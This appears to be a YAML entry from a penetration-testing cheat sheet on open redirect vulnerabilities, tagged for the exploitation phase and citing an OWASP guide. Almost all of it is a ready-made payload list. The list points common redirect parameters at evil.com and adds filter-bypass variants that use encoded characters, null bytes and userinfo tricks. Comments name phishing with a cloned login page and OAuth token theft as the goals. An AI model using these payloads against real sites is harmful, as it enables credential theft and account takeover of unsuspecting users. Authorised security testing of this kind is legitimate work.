---
description: |
  Open Redirect vulnerabilities — test common redirect parameters, bypass filters, and leverage for phishing or OAuth token theft.
command: |
  # Test common redirect parameters
  ?redirect=http://evil.com
  ?url=http://evil.com
  ?next=http://evil.com
  ?return=http://evil.com
  ?dest=http://evil.com
  ?rurl=http://evil.com
  ?go=http://evil.com

  # Bypass filters
  ?redirect=//evil.com
  ?redirect=////evil.com
  ?redirect=https://evil.com@target.com
  ?redirect=http://target.com.evil.com
  ?redirect=http://evil.com%23.target.com
  ?redirect=http://evil.com%00.target.com
  ?redirect=//evil%E3%80%82com

  # Use for phishing (steal creds via cloned login page)
  # Use for OAuth token theft (redirect_uri manipulation)
items:
  - No_Creds
phase:
  - Exploitation
target_os:
  - Linux
  - Windows
services:
  - HTTP
techniques: []
references:
  - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/04-Testing_for_Client-side_URL_Redirect
---
